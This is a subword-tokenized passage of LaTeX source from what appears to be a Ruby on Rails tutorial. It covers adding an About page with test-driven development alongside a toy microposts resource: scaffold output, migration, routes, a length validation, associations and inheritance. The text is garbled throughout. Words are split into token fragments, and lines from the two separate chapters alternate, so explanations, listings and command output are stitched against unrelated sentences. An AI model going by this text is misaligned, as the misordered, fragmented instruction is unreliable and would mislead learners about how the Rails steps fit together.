▁We ' ll ▁add ▁some ▁( ve ry ▁slightly ) ▁dynamic ▁content ▁starting ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages }, ▁but ▁as ▁they ▁stand ▁the ▁views ▁in ▁Listing ~\ ref { code : raw _ home _ view } ▁and ▁Listing ~\ ref { code : raw _ help _ view } ▁ underscore ▁an ▁important ▁point : ▁Rails ▁views ▁can ▁simply ▁contain ▁static ▁HTML . ▁This ▁means ▁we ▁can ▁begin ▁customiz ing ▁the ▁Home ▁and ▁Help ▁pages ▁even ▁with ▁no ▁ knowledg e ▁of ▁Rails , ▁as ▁show n ▁in ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page }.
▁create ▁app / views / microposts / new . html . erb
▁C us to m ▁HTML ▁for ▁the ▁Home ▁page .
▁create ▁app / views / microposts / _ form . html . erb
▁create ▁test / controllers / microposts _ controller _ test . rb
▁C us to m ▁HTML ▁for ▁the ▁Help ▁page .
▁create ▁app / helpers / microposts _ helper . rb
▁< n > ▁G et ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁< n > ▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁create ▁test / helpers / microposts _ helper _ test . rb
▁create ▁app / views / microposts / index . json . j builder
▁The ▁results ▁of ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page } ▁are ▁show n ▁in ▁F igure ~\ ref { fig : custom _ home _ page } ▁and ▁F igure ~\ ref { fig : custom _ help _ page }.
▁create ▁app / views / microposts / show . json . j builder
▁A ▁custom ▁Home ▁page .
▁A ▁custom ▁Help ▁page .
▁Having ▁created ▁and ▁ filled ▁in ▁the ▁Home ▁and ▁Help ▁pages ▁for ▁our ▁sample ▁app ▁( Section ~\ ref { sec : custom _ static _ pages }), ▁now ▁we ' re ▁going ▁to ▁add ▁an ▁About ▁page ▁as ▁well .
▁create ▁app / assets / javascripts / microposts . js . coffee
▁When ▁making ▁a ▁change ▁of ▁this ▁nature , ▁it ' s ▁a ▁good ▁practice ▁to ▁write ▁an ▁\ emph { auto m at ed ▁test } ▁to ▁verify ▁that ▁the ▁feature ▁is ▁implemented ▁correctly .
▁create ▁app / assets / stylesheets / microposts . css . scss
▁De ve lo ped ▁over ▁the ▁course ▁of ▁build ing ▁an ▁application , ▁the ▁result ing ▁\ emph { test ▁suite } ▁serve s ▁as ▁a ▁ safety ▁ net ▁and ▁as ▁executable ▁documentation ▁of ▁the ▁application ▁source ▁code .
▁When ▁done ▁right , ▁writing ▁tests ▁also ▁allows ▁us ▁to ▁develop ▁\ emph { fa s ter } ▁desp ite ▁requiring ▁extra ▁code , ▁because ▁we ' ll ▁end ▁up ▁was ting ▁less ▁time ▁try ing ▁to ▁track ▁down ▁bug s .
▁identical ▁app / assets / stylesheets / scaffold s . css . scss
▁This ▁is ▁true ▁only ▁once ▁we ▁get ▁good ▁at ▁writing ▁tests , ▁though , ▁which ▁is ▁one ▁reason ▁it ' s ▁important ▁to ▁start ▁p r ac tic ing ▁as ▁ early ▁as ▁possible .
▁( If ▁you ▁get ▁an ▁error ▁related ▁to ▁S p r ing , ▁just ▁run ▁the ▁command ▁again .)
▁A lthough ▁virtual ly ▁all ▁Rails ▁developers ▁a g re e ▁that ▁testing ▁is ▁a ▁good ▁idea , ▁there ▁is ▁a ▁d ivers ity ▁of ▁ o p in ion ▁on ▁the ▁details .
▁To ▁update ▁our ▁database ▁with ▁the ▁new ▁data ▁model , ▁we ▁need ▁to ▁run ▁a ▁migration ▁as ▁in ▁Section ~\ ref { sec : demo _ users _ resource } :
▁When ▁to ▁test
▁== ▁Create Micropost s : ▁migrat ing ▁= ============== ================ ================
▁When ▁d ec id ing ▁when ▁and ▁how ▁to ▁test , ▁it ' s ▁helpful ▁to ▁understand ▁\ emph { w h y } ▁to ▁test . ▁In ▁my ▁view , ▁writing ▁automate d ▁tests ▁has ▁three ▁main ▁benefit s :
▁-- ▁create _ table (: microposts )
▁Tests ▁protect ▁again st ▁\ emph { re gr es s ion s }, ▁where ▁a ▁function ing ▁feature ▁stop s ▁working ▁for ▁some ▁reason .
▁-> ▁0.0 0 23 s
▁Tests ▁allow ▁code ▁to ▁be ▁\ emph { refactored } ▁( i . e . , ▁changing ▁its ▁form ▁without ▁changing ▁its ▁function ) ▁with ▁greater ▁confidence .
▁== ▁Create Micropost s : ▁migrat ed ▁( 0 . 00 2 6 s ) ▁ ========== ============== ==============
▁Tests ▁act ▁as ▁a ▁\ emph { client } ▁for ▁the ▁application ▁code , ▁there by ▁help ing ▁determine ▁its ▁design ▁and ▁its ▁interface ▁with ▁other ▁parts ▁of ▁the ▁system .
▁Now ▁we ▁are ▁in ▁a ▁position ▁to ▁create ▁microposts ▁in ▁the ▁same ▁way ▁we ▁created ▁users ▁in ▁Section ~\ ref { sec : a _ user _ to ur }.
▁A lthough ▁non e ▁of ▁the ▁above ▁benefit s ▁\ emph { require } ▁that ▁tests ▁be ▁written ▁first , ▁there ▁are ▁many ▁c ir c um st ance s ▁where ▁test - driven ▁development ▁( TDD ) ▁is ▁a ▁ v al u able ▁tool ▁to ▁have ▁in ▁your ▁ k it .
▁as ▁seen ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁De c id ing ▁when ▁and ▁how ▁to ▁test ▁depend s ▁in ▁part ▁on ▁how ▁com for table ▁you ▁are ▁writing ▁tests ; ▁many ▁developers ▁find ▁that , ▁as ▁they ▁get ▁better ▁at ▁writing ▁tests , ▁they ▁are ▁more ▁in c line d ▁to ▁write ▁them ▁first .
▁The ▁scaffold ▁code ▁may ▁have ▁extra ▁new line s ▁compare d ▁to ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁It ▁also ▁depend s ▁on ▁how ▁difficult ▁the ▁test ▁is ▁relative ▁to ▁the ▁application ▁code , ▁how ▁precise ly ▁the ▁desired ▁features ▁are ▁known , ▁and ▁how ▁likely ▁the ▁feature ▁is ▁to ▁break ▁in ▁the ▁future .
▁This ▁is ▁not ▁a ▁cause ▁for ▁concern , ▁as ▁Ruby ▁ignore s ▁extra ▁new line s .
▁In ▁this ▁context , ▁it ' s ▁helpful ▁to ▁have ▁a ▁set ▁of ▁guide line s ▁on ▁when ▁we ▁should ▁test ▁first ▁( or ▁test ▁at ▁all ).
▁The ▁Rails ▁routes , ▁with ▁a ▁new ▁rule ▁for ▁Microposts ▁resources .
▁Here ▁are ▁some ▁suggest ion s ▁base d ▁on ▁my ▁own ▁experience :
▁When ▁a ▁test ▁is ▁es pecially ▁short ▁or ▁simple ▁compare d ▁to ▁the ▁application ▁code ▁it ▁tests , ▁ le an ▁toward ▁writing ▁the ▁test ▁first .
▁/ microposts
▁When ▁the ▁desired ▁behavior ▁is n ' t ▁yet ▁c ry st al ▁clear , ▁ le an ▁toward ▁writing ▁the ▁application ▁code ▁first , ▁the n ▁write ▁a ▁test ▁to ▁co d ify ▁the ▁result .
▁page ▁to ▁list ▁all ▁microposts
▁Because ▁security ▁is ▁a ▁to p ▁prior ity , ▁ er r ▁on ▁the ▁side ▁of ▁writing ▁tests ▁of ▁the ▁security ▁model ▁first .
▁/ microposts /1
▁When ever ▁a ▁bug ▁is ▁found , ▁write ▁a ▁test ▁to ▁re p r o d u ce ▁it ▁and ▁protect ▁again st ▁re gr es s ion s , ▁the n ▁write ▁the ▁application ▁code ▁to ▁fix ▁it .
▁page ▁to ▁show ▁micropost ▁with ▁id ▁\ k ode {1}
▁L e an ▁again st ▁writing ▁tests ▁for ▁code ▁( such ▁as ▁ detailed ▁HTML ▁structure ) ▁likely ▁to ▁change ▁in ▁the ▁future .
▁/ microposts / new
▁page ▁to ▁make ▁a ▁new ▁micropost
▁Writ e ▁tests ▁before ▁refactoring ▁code , ▁focus ing ▁on ▁testing ▁error - prone ▁code ▁that ' s ▁es pecially ▁likely ▁to ▁break .
▁In ▁practice , ▁the ▁guide line s ▁above ▁mean ▁that ▁we ' ll ▁usually ▁write ▁controller ▁and ▁model ▁tests ▁first ▁and ▁integration ▁tests ▁( which ▁test ▁functionality ▁across ▁models , ▁views , ▁and ▁controllers ) ▁second .
▁create ▁a ▁new ▁micropost
▁And ▁when ▁we ' re ▁writing ▁application ▁code ▁that ▁is n ' t ▁particular ly ▁brittle ▁or ▁error - prone , ▁or ▁is ▁likely ▁to ▁change ▁( as ▁is ▁often ▁the ▁case ▁with ▁views ), ▁we ' ll ▁often ▁skip ▁testing ▁ al together .
▁/ microposts /1/ edit
▁Ou r ▁main ▁testing ▁tool s ▁will ▁be ▁\ emph { controller ▁tests } ▁( start ing ▁in ▁this ▁section ), ▁\ emph { model ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }), ▁and ▁\ emph { integration ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : sign _ up }).
▁page ▁to ▁edit ▁micropost ▁with ▁id ▁\ k ode {1}
▁ Integration ▁tests ▁are ▁es pecially ▁powerful , ▁as ▁they ▁allow ▁us ▁to ▁simul ate ▁the ▁actions ▁of ▁a ▁user ▁interact ing ▁with ▁our ▁application ▁using ▁a ▁web ▁browser .
▁update ▁micropost ▁with ▁id ▁\ k ode {1}
▁ Integration ▁tests ▁will ▁eventual ly ▁be ▁our ▁primary ▁testing ▁technique , ▁but ▁controller ▁tests ▁give ▁us ▁an ▁easier ▁place ▁to ▁start .
▁< n >< n > ▁\ subsection { O ur ▁first ▁test } ▁% ▁( fold )< n > ▁\ label { sec : our _ first _ test }< n >< n >
▁Now ▁it ' s ▁time ▁to ▁add ▁an ▁About ▁page ▁to ▁our ▁application .
▁delete ▁micropost ▁with ▁id ▁\ k ode {1}
▁We ' ll ▁the n ▁use ▁the ▁failing ▁test ▁to ▁d r ive ▁the ▁writing ▁of ▁the ▁application ▁code .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource }.
▁ Getting ▁started ▁with ▁testing ▁can ▁be ▁challenging , ▁requiring ▁ ext en s ive ▁ knowledg e ▁of ▁both ▁Rails ▁and ▁Ruby .
▁The ▁Microposts ▁controller ▁itself ▁appears ▁in ▁schematic ▁form ▁Listing ~\ ref { code : demo _ microposts _ controller }.
▁At ▁this ▁ early ▁stage , ▁writing ▁tests ▁m ight ▁thus ▁seem ▁hope less ly ▁in t i m id at ing .
▁in ▁Listing ~\ ref { code : demo _ users _ controller }.
▁L uckily , ▁Rails ▁has ▁already ▁done ▁the ▁hard est ▁part ▁for ▁us , ▁because ▁\ k ode { rails ▁generate ▁controller } ▁( Listing ~\ ref { code : generating _ pages }) ▁automatically ▁generated ▁a ▁test ▁file ▁to ▁get ▁us ▁started :
▁This ▁is ▁a ▁reflect ion ▁of ▁the ▁REST ▁architecture ▁common ▁to ▁both ▁resources .
▁Let ' s ▁take ▁a ▁look ▁at ▁it ▁( Listing ~\ ref { code : default _ controller _ test }).
▁The ▁Microposts ▁controller ▁in ▁schematic ▁form .
▁The ▁default ▁tests ▁for ▁the ▁StaticPages ▁controller .
▁It ' s ▁not ▁important ▁at ▁this ▁point ▁to ▁understand ▁the ▁syntax ▁in ▁Listing ~\ ref { code : default _ controller _ test } ▁in ▁detail , ▁but ▁we ▁can ▁see ▁that ▁there ▁are ▁two ▁tests , ▁one ▁for ▁each ▁controller ▁action ▁we ▁included ▁on ▁the ▁command ▁line ▁in ▁Listing ~\ ref { code : generating _ pages }.
▁ Each ▁test ▁simply ▁get s ▁an ▁action ▁and ▁verifie s ▁( via ▁an ▁\ emph { assert ion }) ▁that ▁the ▁result ▁is ▁a ▁ success .
▁The ▁response ▁\ k ode { : success } ▁is ▁an ▁abstract ▁representation ▁of ▁the ▁under ly ing ▁HTTP ▁\ href { http :// en . wiki p edia . org / wiki / L ist _ of _ HTTP _ status _ code s }{ status ▁code } ▁( in ▁this ▁case , ▁\ href { http :// en . wiki p edia . org / wiki / L ist _ of _ HTTP _ status _ code s # 2 x x _ S u cc es s }{ 200 ▁O K }).
▁In ▁other ▁words , ▁a ▁test ▁like
▁To ▁begin ▁our ▁testing ▁cycle , ▁we ▁need ▁to ▁run ▁our ▁test ▁suite ▁to ▁verify ▁that ▁the ▁tests ▁current ly ▁pass .
▁As ▁noted ▁in ▁Section ~\ ref { sec : demo _ users _ resource }, ▁the ▁use ▁of ▁\ k ode { bundle ▁exec } ▁is ▁unnecessary ▁on ▁some ▁systems , ▁including ▁the ▁cloud ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment }, ▁but ▁I ▁include ▁it ▁for ▁completeness .
▁In ▁practice , ▁my ▁usual ▁algorithm ▁is ▁to ▁omit ▁\ k ode { bundle ▁exec } ▁unless ▁I ▁get ▁an ▁error , ▁in ▁which ▁case ▁I ▁re - try ▁with ▁\ k ode { bundle ▁exec } ▁and ▁see ▁if ▁it ▁works .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 2 ▁tests , ▁2 ▁assertion s , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁As ▁required , ▁initially ▁our ▁test ▁suite ▁is ▁passing ▁(\ passing ).
▁By ▁the ▁way , ▁the ▁tests ▁take ▁some ▁time ▁to ▁start , ▁which ▁is ▁due ▁to ▁two ▁factor s : ▁ (1) ▁starting ▁the ▁\ emph { S p r ing ▁server } ▁to ▁p reload ▁parts ▁of ▁the ▁Rails ▁environment , ▁which ▁only ▁happens ▁the ▁first ▁time ; ▁and ▁ (2) ▁overhead ▁ associated ▁with ▁Ruby ▁start up ▁time .
▁( The ▁second ▁factor ▁is ▁a me li or at ed ▁when ▁using ▁Guard ▁as ▁suggest ed ▁in ▁Section ~\ ref { sec : guard }. )
▁Because ▁many ▁testing ▁tool s ▁represent ▁failing ▁tests ▁with ▁the ▁color ▁re d ▁and ▁passing ▁tests ▁with ▁the ▁color ▁green , ▁this ▁sequence ▁is ▁some times ▁known ▁as ▁the ▁`` R ed , ▁G re en , ▁Re factor '' ▁cycle .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ new _ micropost }.
▁By ▁default , ▁\ k ode { rake ▁test } ▁shows ▁re d ▁when ▁the ▁tests ▁fail , ▁but ▁does n ' t ▁show ▁green ▁when ▁the ▁tests ▁pass .
▁To ▁arrange ▁for ▁a ▁true ▁Re d - - G re en ▁cycle , ▁see ▁Section ~\ ref { sec : mini test _ reporters }.
▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }).
▁Ou r ▁first ▁step ▁is ▁to ▁write ▁a ▁failing ▁test ▁for ▁the ▁About ▁page .
▁At ▁this ▁point , ▁go ▁a head ▁and ▁create ▁a ▁micropost ▁or ▁two , ▁tak ing ▁care ▁to ▁make ▁sure ▁that ▁at ▁least ▁one ▁has ▁a ▁\ k ode { user \_ id } ▁of ~\ k ode {1} ▁to ▁match ▁the ▁id ▁of ▁the ▁first ▁user ▁created ▁in ▁Section ~\ ref { sec : a _ user _ to ur }.
▁Follow ing ▁the ▁models ▁from ▁Listing ~\ ref { code : default _ controller _ test }, ▁you ▁can ▁ probably ▁guess ▁the ▁right ▁test , ▁which ▁is ▁show n ▁in ▁Listing ~\ ref { code : about _ test }.
▁The ▁result ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : demo _ micropost _ index }.
▁A ▁test ▁for ▁the ▁About ▁page .
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }).
▁\ failing ▁\ \ ▁\ file path { test / controllers / static \_ pages \_ controller \_ test . rb } }< n > %= ▁ lang : ruby , ▁options : ▁" h l _ line s " : ▁[ 15 , ▁ 16 , ▁ 17 , ▁ 18 ] < n >\ begin { code }< n > require ▁' test _ helper ' < n >< n > class ▁StaticPages Controller Test ▁< ▁ ActionController :: TestCase < n >< n > ▁test ▁" s h o ul d ▁get ▁home " ▁do < n > ▁get ▁: home < n > ▁ assert _ response ▁: success
▁Any ▁\ emph { micro } post ▁worth y ▁of ▁the ▁name ▁should ▁have ▁some ▁means ▁of ▁enforc ing ▁the ▁length ▁of ▁the ▁post .
▁Co n str a in ing ▁microposts ▁to ▁be ▁at ▁most ▁ 140 ▁characters .
▁We ▁see ▁from ▁the ▁highlight ed ▁lines ▁in ▁Listing ~\ ref { code : about _ test } ▁that ▁the ▁test ▁for ▁the ▁About ▁page ▁is ▁the ▁same ▁as ▁the ▁Home ▁and ▁Help ▁tests ▁with ▁the ▁word ▁`` about '' ▁in ▁place ▁of ▁`` home '' ▁or ▁`` help ''.
▁The ▁code ▁in ▁Listing ~\ ref { code : demo _ length _ validation } ▁may ▁look ▁rather ▁mysterious --- we ' ll ▁cover ▁validations ▁more ▁ th or ough ly ▁starting ▁in ▁Section ~\ ref { sec : user _ validations }--- but ▁its ▁effect s ▁are ▁read ily ▁apparent ▁if ▁we ▁go ▁to ▁the ▁new ▁micropost ▁page ▁and ▁enter ▁more ▁than ▁ 140 ▁characters ▁for ▁the ▁content ▁of ▁the ▁post .
▁As ▁required , ▁the ▁test ▁initially ▁fails :
▁As ▁seen ▁in ▁F igure ~\ ref { fig : micropost _ length _ error }, ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁tests , ▁2 ▁assertion s , ▁0 ▁failure s , ▁1 ▁errors , ▁0 ▁skip s
▁( We ' ll ▁learn ▁more ▁about ▁error ▁messages ▁in ▁Section ~\ ref { sec : signup _ error _ messages }. )
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation .
▁One ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails ▁is ▁the ▁ability ▁to ▁form ▁\ emph { associations } ▁between ▁different ▁data ▁models .
▁In ▁the ▁case ▁of ▁our ▁User ▁model , ▁each ▁user ▁ potentially ▁has ▁many ▁microposts .
▁We ▁can ▁get ▁started ▁by ▁examining ▁the ▁error ▁message ▁output ▁by ▁the ▁failing ▁test
▁We ▁can ▁express ▁this ▁in ▁code ▁by ▁updating ▁the ▁User ▁and ▁Micropost ▁models ▁as ▁in ▁Listing ~\ ref { code : demo _ user _ has _ many _ microposts } ▁and ▁Listing ~\ ref { code : demo _ micropost _ belongs _ to _ user }.
▁On ▁some ▁systems , ▁you ▁may ▁have ▁to ▁ sc r o ll ▁ past ▁the ▁`` stack ▁trace '' ▁or ▁`` backtrace '' ▁that ▁trace s ▁the ▁error ' s ▁path ▁through ▁the ▁source ▁code .
▁A ▁user ▁has ▁many ▁microposts .
▁See ▁Section ~\ ref { sec : backtrace _ silencer } ▁for ▁information ▁on ▁how ▁to ▁filter ▁this ▁ backtrace ▁to ▁eliminate ▁un w ant ed ▁lines .
▁A ▁micropost ▁belongs ▁to ▁a ▁user .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > ActionController :: U r l G en er ation Error : < n > N o ▁route ▁matches ▁ { : action =>" about ", ▁: controller =>" static _ pages "}
▁We ▁can ▁ visual ize ▁the ▁result ▁of ▁this ▁association ▁in ▁F igure ~\ ref { fig : micropost _ user _ association }.
▁The ▁error ▁message ▁here ▁say s ▁that ▁no ▁route ▁matches ▁the ▁desired ▁action / controller ▁combination , ▁which ▁is ▁a ▁hint ▁that ▁we ▁need ▁to ▁add ▁a ▁line ▁to ▁the ▁routes ▁file .
▁Because ▁of ▁the ▁\ k ode { user \_ id } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table , ▁Rails ▁( using ▁Active ▁Record ) ▁can ▁infer ▁the ▁microposts ▁ associated ▁with ▁each ▁user .
▁We ▁can ▁accomplish ▁this ▁by ▁following ▁the ▁pattern ▁in ▁Listing ~\ ref { code : pages _ routes }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : about _ route }.
▁The ▁association ▁between ▁microposts ▁and ▁users .
▁ Adding ▁the ▁\ k ode { about } ▁route .
▁In ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users }, ▁we ▁will ▁use ▁the ▁association ▁of ▁users ▁and ▁microposts ▁both ▁to ▁display ▁all ▁of ▁a ▁user ' s ▁microposts ▁and ▁to ▁construct ▁a ▁Twitter - like ▁micropost ▁feed .
▁For ▁now , ▁we ▁can ▁examine ▁the ▁implications ▁of ▁the ▁user - micropost ▁association ▁by ▁using ▁the ▁\ emph { console }, ▁which ▁is ▁a ▁useful ▁tool ▁for ▁interact ing ▁with ▁Rails ▁applications .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > Abstract Controller :: Action N o t F ound : < n > The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁the n ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User . first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first \_ user })
▁The ▁error ▁message ▁now ▁indicates ▁a ▁missing ▁\ k ode { about } ▁action ▁in ▁the ▁Static ▁Pages ▁controller , ▁which ▁we ▁can ▁add ▁by ▁following ▁the ▁model ▁provided ▁by ▁\ k ode { home } ▁and ▁\ k ode { help } ▁in ▁Listing ~\ ref { code : static _ pages _ controller }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : adding _ the _ about _ page }.
▁The ▁Static ▁Pages ▁controller ▁with ▁added ▁\ k ode { about } ▁action .
▁=> ▁[ # < Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁created _ at :
▁micropost . user
▁ $ ▁bundle ▁exec ▁rake ▁test < n > ActionView :: Missing Template : ▁ Missing ▁template ▁static _ pages / about
▁( I ▁include ▁\ k ode { ex it } ▁in ▁the ▁last ▁line ▁just ▁to ▁demonstrate ▁how ▁to ▁exit ▁the ▁console .
▁This ▁indicates ▁a ▁missing ▁template , ▁which ▁in ▁the ▁context ▁of ▁Rails ▁is ▁essential ly ▁the ▁same ▁thing ▁as ▁a ▁view .
▁On ▁most ▁systems , ▁you ▁can ▁also ▁use ▁ Ctrl - D ▁for ▁the ▁same ▁purpose .)
▁The ▁way ▁to ▁create ▁a ▁file ▁var ies ▁by ▁system ▁setup , ▁but ▁most ▁text ▁editor s ▁will ▁let ▁you ▁control - click ▁inside ▁the ▁directory ▁where ▁you ▁want ▁to ▁create ▁the ▁file ▁to ▁ br ing ▁up ▁a ▁menu ▁with ▁a ▁`` New ▁File '' ▁menu ▁item .
▁A l ter n ate ly , ▁you ▁can ▁use ▁the ▁File ▁menu ▁to ▁create ▁a ▁new ▁file ▁and ▁the n ▁ pick ▁the ▁proper ▁directory ▁when ▁saving ▁it .
▁With ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ).
▁F inally , ▁you ▁can ▁use ▁my ▁favor ite ▁trick ▁by ▁apply ing ▁the ▁\ href { http :// en . wiki p edia . org / wiki / To u ch _ ( U n i x )} { U n i x ▁ touch ▁command } ▁as ▁follows :
▁We ' ll ▁learn ▁much ▁more ▁about ▁the ▁association ▁facilit ies ▁in ▁Active ▁Record ▁in ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users }.
▁A lthough ▁\ k ode { touch } ▁is ▁design ed ▁to ▁update ▁the ▁modification ▁timestamp ▁of ▁a ▁file ▁or ▁directory ▁without ▁otherwise ▁a ffect ing ▁it , ▁as ▁a ▁side - e ffect ▁it ▁creates ▁a ▁new ▁( blank ) ▁file ▁if ▁one ▁does n ' t ▁already ▁exist .
▁We ▁end ▁our ▁discussion ▁of ▁the ▁toy ▁application ▁with ▁a ▁brief ▁description ▁of ▁the ▁controller ▁and ▁model ▁class ▁ hierarchies ▁in ▁Rails .
▁( If ▁using ▁the ▁cloud ▁IDE , ▁you ▁may ▁have ▁to ▁refresh ▁the ▁file ▁ tree ▁as ▁describe d ▁in ▁Section ~\ ref { sec : bundle r }. )
▁This ▁discussion ▁will ▁only ▁make ▁much ▁sense ▁if ▁you ▁have ▁some ▁experience ▁with ▁object - or i ent ed ▁programming ▁( O O P ) ; ▁if ▁you ▁have n ' t ▁stud i ed ▁O O P , ▁feel ▁free ▁to ▁skip ▁this ▁section .
▁in ▁Listing ~\ ref { code : custom _ about _ page }.
▁In ▁particular , ▁if ▁you ▁are ▁un familiar ▁with ▁\ emph { classes } ▁( discusse d ▁in ▁Section ~\ ref { sec : ruby _ classes }), ▁I ▁suggest ▁loop ing ▁back ▁to ▁this ▁section ▁at ▁a ▁later ▁time .
▁We ▁start ▁with ▁the ▁inheritance ▁structure ▁for ▁models .
▁Code ▁for ▁the ▁About ▁page .
▁ Compar ing ▁Listing ~\ ref { code : demo _ user _ class } ▁and ▁Listing ~\ ref { code : demo _ micropost _ class }, ▁we ▁see ▁that ▁both ▁the ▁User ▁model ▁and ▁the ▁Micropost ▁model ▁inherit ▁( via ▁the ▁left ▁ angle ▁bracket ~\ k ode { < }) ▁from ▁\ k ode { ActiveRecord :: Base }, ▁which ▁is ▁the ▁base ▁class ▁for ▁models ▁provided ▁by ▁ActiveRecord ; ▁a ▁diagram ▁summariz ing ▁this ▁relationship ▁appears ▁in ▁F igure ~\ ref { fig : demo _ model _ inheritance }.
▁Ruby ▁on ▁Rails < n > ▁Tutorial
▁and ▁so ~ on .
▁< n > ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁The ▁\ k ode { User } ▁class , ▁highlight ing ▁inheritance .
▁At ▁this ▁point , ▁running ▁\ k ode { rake ▁test } ▁should ▁get ▁us ▁back ▁to ▁\ passing :
▁The ▁\ k ode { Micropost } ▁class , ▁highlight ing ▁inheritance .
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁tests , ▁3 ▁assertion s , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁User ▁and ▁Micropost ▁models .
▁Of ▁course , ▁it ' s ▁ never ▁a ▁ bad ▁idea ▁to ▁take ▁a ▁look ▁at ▁the ▁page ▁in ▁a ▁browser ▁to ▁make ▁sure ▁our ▁tests ▁are n ' t ▁completely ▁c ra z y ▁( F igure ~\ ref { fig : about _ us }).
▁The ▁inheritance ▁structure ▁for ▁controllers ▁is ▁only ▁slightly ▁more ▁complicated .
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }).
▁ Compar ing ▁Listing ~\ ref { code : demo _ users _ controller _ class } ▁and ▁Listing ~\ ref { code : demo _ microposts _ controller _ class }, ▁we ▁see ▁that ▁both ▁the ▁Users ▁controller ▁and ▁the ▁Microposts ▁controller ▁inherit ▁from ▁the ▁Application ▁controller .
▁Now ▁that ▁we ' ve ▁go tt en ▁to ▁\ passing , ▁we ▁are ▁free ▁to ▁refactor ▁our ▁code ▁with ▁confidence .
▁ Ex am in ing ▁Listing ~\ ref { code : toy _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁When ▁developing ▁an ▁application , ▁often ▁code ▁will ▁start ▁to ▁`` s me ll '' , ▁meaning ▁that ▁it ▁get s ▁ugly , ▁ blo at ed , ▁or ▁ filled ▁with ▁repetition .
▁The ▁relationships ▁between ▁these ▁classes ▁is ▁illustrate d ▁in ▁F igure ~\ ref { fig : demo _ controller _ inheritance }.
▁The ▁computer ▁does n ' t ▁care ▁what ▁the ▁code ▁look s ▁like , ▁of ▁course , ▁but ▁human s ▁do , ▁so ▁it ▁is ▁important ▁to ▁keep ▁the ▁code ▁base ▁clean ▁by ▁refactoring ▁frequent ly .
▁The ▁\ k ode { UsersController } ▁class , ▁highlight ing ▁inheritance .
▁A lthough ▁our ▁sample ▁app ▁is ▁a ▁little ▁too ▁small ▁to ▁refactor ▁right ▁now , ▁\ href { https :// en . wiki p edia . org / wiki / C ode _ s me ll }{ code ▁ s me ll } ▁see p s ▁in ▁at ▁every ▁c rack , ▁and ▁we ' ll ▁get ▁started ▁refactoring ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby }.
▁< n >< n > ▁% ▁sub subsection ▁refactor ▁( end )< n >< n > ▁% ▁subsection ▁our _ first _ test < n >< n > ▁% ▁section ▁getting _ started _ with _ test ing ▁( end )< n >< n >< n > ▁\ section { S l ight ly ▁dynamic ▁pages } ▁% ▁( fold )< n > ▁\ label { sec : slightly _ dynamic _ pages }< n >< n >
▁The ▁\ k ode { Micropost sController } ▁class , ▁highlight ing ▁inheritance .
▁Now ▁that ▁we ' ve ▁created ▁the ▁actions ▁and ▁views ▁for ▁some ▁static ▁pages , ▁we ' ll ▁make ▁them ▁\ emph { slightly } ▁dynamic ▁by ▁adding ▁some ▁content ▁that ▁changes ▁on ▁a ▁per - page ▁basis : ▁we ' ll ▁have ▁the ▁title ▁of ▁each ▁page ▁change ▁to ▁reflect ▁its ▁content .
